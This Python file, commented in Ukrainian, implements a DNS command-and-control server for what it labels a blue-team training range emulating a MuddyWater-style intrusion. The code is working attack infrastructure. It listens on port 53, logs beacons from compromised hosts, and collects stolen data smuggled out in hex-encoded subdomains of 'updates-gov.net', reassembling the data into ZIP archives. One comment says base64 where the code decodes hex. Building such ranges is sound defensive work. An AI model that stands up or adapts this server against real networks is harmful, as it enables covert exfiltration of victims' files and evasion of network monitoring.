#!/usr/bin/env python3
# =============================================================================
# c2_server.py — DNS C2 Server для MUDDYWATER тренінгу
# Запускати на 172.16.50.10 (C2 машина)
# EXERCISE ONLY — CyberRanges blue team training — SET University
# =============================================================================
# Що робить:
#   1. Слухає UDP/53 — приймає всі DNS запити від блоків
#   2. Декодує DNS beacons (статуси від B1-B6)
#   3. Збирає exfil chunks від block5 → відновлює ZIP архів
#   4. Логує все в c2_server.log
#   5. Відповідає на DNS запити (щоб Resolve-DnsName не висів)
#
# Формати запитів:
#   Beacon:     <base64_label>.updates-gov.net
#   Exfil meta: 0000.<base64_meta>.exfil.updates-gov.net
#   Exfil chunk: 0001.<chunk_b64>.exfil.updates-gov.net
#
# Встановлення залежностей:
#   pip3 install dnslib
#
# Запуск:
#   sudo python3 c2_server.py
#   sudo python3 c2_server.py --ip 172.16.50.10 --port 53 --out ./received/
# =============================================================================

import socket
import threading
import base64
import os
import re
import argparse
import struct
from datetime import datetime
from collections import defaultdict

try:
    from dnslib import DNSRecord, DNSHeader, DNSQuestion, RR, A, QTYPE, DNSError
    HAS_DNSLIB = True
except ImportError:
    HAS_DNSLIB = False

# ── Конфіг ───────────────────────────────────────────────────────────────────

C2_DOMAIN   = "updates-gov.net"
EXFIL_SUB   = "exfil"
FAKE_IP     = "172.16.50.10"   # відповідь на всі A-запити
LOG_FILE    = "c2_server.log"
OUT_DIR     = "./received"

# ── Сховище exfil chunks (per source IP) ──────────────────────────────────────
# { "192.168.x.x": { "meta": {...}, "chunks": {1: "abc", 2: "def", ...} } }
exfil_sessions = defaultdict(lambda: {"meta": None, "chunks": {}, "total": None})
sessions_lock  = threading.Lock()

# ── Логування ─────────────────────────────────────────────────────────────────

def log(msg, level="INFO", src_ip=""):
    ts   = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    src  = f" [{src_ip}]" if src_ip else ""
    line = f"{ts} [{level}]{src} {msg}"
    print(line)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(line + "\n")

# ── Base64 декодування (реверс PS encoding) ───────────────────────────────────

def b64_decode(encoded: str) -> bytes:
    """Hex декодування (замість base64 — без колізій x/y)."""
    return bytes.fromhex(encoded)

def b64_decode_str(encoded: str) -> str:
    try:
        return bytes.fromhex(encoded).decode("utf-8", errors="replace")
    except Exception:
        return f"<decode_error:{encoded}>"

# ── Розбір DNS label ──────────────────────────────────────────────────────────

def parse_query(qname: str, src_ip: str):
    """
    Парсить DNS query name і вирішує що з ним робити.
    Повертає тип: 'beacon' | 'exfil_meta' | 'exfil_chunk' | 'unknown'
    """
    qname = qname.rstrip(".")
    domain_suffix = C2_DOMAIN

    if not qname.lower().endswith(domain_suffix):
        log(f"Unknown domain: {qname}", "WARN", src_ip)
        return "unknown"

    # Прибираємо суфікс домену
    prefix = qname[: -(len(domain_suffix) + 1)]  # без крапки перед доменом
    parts  = prefix.split(".")

    # ── Exfil: <seq>.<chunk>.exfil  (3 частини де остання = "exfil")
    if len(parts) >= 3 and parts[-1].lower() == EXFIL_SUB:
        seq_str = parts[0]
        chunk   = parts[1] if len(parts) >= 2 else ""

        if seq_str == "0000":
            # Метадані
            meta_str = b64_decode_str(chunk)
            log(f"EXFIL META: {meta_str}", "EXFIL", src_ip)
            # META:<hostname>:<username>:<total_chunks>:<archive_size>
            meta_parts = meta_str.split(":")
            with sessions_lock:
                session = exfil_sessions[src_ip]
                session["meta"] = meta_str
                # Формат: META:<total>:<size> або META:<host>:<user>:<total>:<size>
                # Беремо перше ціле число після "META" як total
                for part in meta_parts[1:]:
                    try:
                        session["total"] = int(part)
                        log(f"Очікуємо {session['total']} chunks від {src_ip}", "EXFIL", src_ip)
                        break
                    except ValueError:
                        continue
            return "exfil_meta"

        else:
            # Chunk даних
            try:
                seq = int(seq_str)
            except ValueError:
                log(f"Bad seq: {seq_str}", "WARN", src_ip)
                return "unknown"

            with sessions_lock:
                session = exfil_sessions[src_ip]
                session["chunks"][seq] = chunk
                received = len(session["chunks"])
                total    = session["total"] or "?"

            if received % 50 == 0 or received == total:
                log(f"EXFIL chunk {seq:04d} | received {received}/{total}", "EXFIL", src_ip)

            # Якщо всі chunks отримано — збираємо файл
            with sessions_lock:
                session = exfil_sessions[src_ip]
                if session["total"] and len(session["chunks"]) >= session["total"]:
                    _reassemble(src_ip, session)

            return "exfil_chunk"

    # ── Beacon: <label>.<domain>  (пряме ASCII, без кодування)
    elif len(parts) == 1:
        label = parts[0].replace("-", ":")
        log(f"BEACON: {label}", "BEACON", src_ip)
        return "beacon"

    else:
        log(f"Unrecognized query: {qname}", "WARN", src_ip)
        return "unknown"

# ── Зборка файлу з chunks ─────────────────────────────────────────────────────

def _reassemble(src_ip: str, session: dict):
    """Збирає отримані chunks в ZIP файл."""
    chunks  = session["chunks"]
    total   = session["total"]
    meta    = session.get("meta", "unknown")

    log(f"Reassembling {len(chunks)}/{total} chunks...", "EXFIL", src_ip)

    # Збираємо base64 рядок в порядку sequence
    b64_dns = "".join(chunks[i] for i in sorted(chunks.keys()))

    try:
        raw_bytes = b64_decode(b64_dns)
    except Exception as e:
        log(f"Decode error: {e}", "ERROR", src_ip)
        return

    # Назва файлу
    os.makedirs(OUT_DIR, exist_ok=True)
    ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_ip  = src_ip.replace(".", "_")
    out_path = os.path.join(OUT_DIR, f"exfil_{safe_ip}_{ts}.zip")

    with open(out_path, "wb") as f:
        f.write(raw_bytes)

    log(f"FILE SAVED: {out_path} ({len(raw_bytes)} bytes) | meta={meta}", "EXFIL", src_ip)

    # Очищаємо сесію
    exfil_sessions[src_ip] = {"meta": None, "chunks": {}, "total": None}

# ── DNS відповідь ──────────────────────────────────────────────────────────────

def build_dns_response(data: bytes) -> bytes:
    """Будує мінімальну DNS відповідь з A-записом."""
    if not HAS_DNSLIB:
        # Мінімальна відповідь вручну: копіюємо header і ставимо QR=1
        if len(data) < 12:
            return data
        resp = bytearray(data)
        resp[2] = 0x81  # QR=1, Opcode=0, AA=1, TC=0, RD=1
        resp[3] = 0x80  # RA=1
        return bytes(resp)

    try:
        request  = DNSRecord.parse(data)
        response = request.reply()
        qname    = str(request.q.qname)
        response.add_answer(RR(qname, QTYPE.A, rdata=A(FAKE_IP), ttl=60))
        return response.pack()
    except Exception:
        return data

# ── UDP сервер ────────────────────────────────────────────────────────────────

def handle_packet(data: bytes, addr: tuple, sock: socket.socket):
    src_ip = addr[0]
    try:
        # Парсимо query name
        if HAS_DNSLIB:
            record = DNSRecord.parse(data)
            qname  = str(record.q.qname)
        else:
            # Простий парсинг query name з raw UDP
            qname = _raw_parse_qname(data)

        if qname:
            parse_query(qname, src_ip)

        # Відповідаємо клієнту (щоб Resolve-DnsName не таймаутився)
        response = build_dns_response(data)
        sock.sendto(response, addr)

    except Exception as e:
        log(f"Packet error from {src_ip}: {e}", "ERROR")

def _raw_parse_qname(data: bytes) -> str:
    """Парсить DNS query name без dnslib."""
    try:
        pos    = 12  # пропускаємо DNS header
        labels = []
        while pos < len(data):
            length = data[pos]
            if length == 0:
                break
            pos += 1
            labels.append(data[pos:pos+length].decode("ascii", errors="replace"))
            pos += length
        return ".".join(labels) + "."
    except Exception:
        return ""

def run_server(bind_ip: str, port: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((bind_ip, port))

    log(f"C2 DNS Server listening on {bind_ip}:{port}", "START")
    log(f"Domain: {C2_DOMAIN} | Fake IP: {FAKE_IP}", "START")
    log(f"Logs: {LOG_FILE} | Output: {OUT_DIR}/", "START")
    if not HAS_DNSLIB:
        log("dnslib not installed — відповіді спрощені. pip3 install dnslib", "WARN")

    while True:
        try:
            data, addr = sock.recvfrom(512)
            t = threading.Thread(target=handle_packet, args=(data, addr, sock), daemon=True)
            t.start()
        except KeyboardInterrupt:
            log("Server stopped.", "STOP")
            break
        except Exception as e:
            log(f"Server error: {e}", "ERROR")

# ── Main ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MUDDYWATER C2 DNS Server")
    parser.add_argument("--ip",   default="0.0.0.0",      help="IP to bind (default: 0.0.0.0)")
    parser.add_argument("--port", default=53, type=int,    help="UDP port (default: 53)")
    parser.add_argument("--out",  default="./received",    help="Output dir for exfil files")
    args = parser.parse_args()

    OUT_DIR  = args.out
    LOG_FILE = os.path.join(os.path.dirname(args.out) or ".", "c2_server.log")

    os.makedirs(OUT_DIR, exist_ok=True)
    run_server(args.ip, args.port)
